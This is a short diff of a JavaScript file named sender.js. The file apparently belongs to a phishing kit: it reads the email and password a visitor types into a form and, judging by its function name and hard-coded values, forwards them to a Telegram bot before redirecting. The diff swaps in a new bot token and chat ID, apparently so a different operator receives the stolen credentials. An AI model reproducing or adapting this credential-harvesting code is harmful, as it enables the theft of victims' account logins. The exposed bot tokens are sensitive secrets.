@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
-  const chatId = 5349229520; // Replace with your chat ID
+  const telegramBotToken = "8485438526:AAGWBrDJLBB-PP5uVPbqT-hzo67dSNBanqU"; // Replace with your Telegram bot token
+  const chatId = 6501229428; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
@@ -55,3 +55,4 @@ const activeSubmit = document.querySelector(".password");
   button.style.color = "#ffffff";
   button.style.border = "none";
 }); */
+
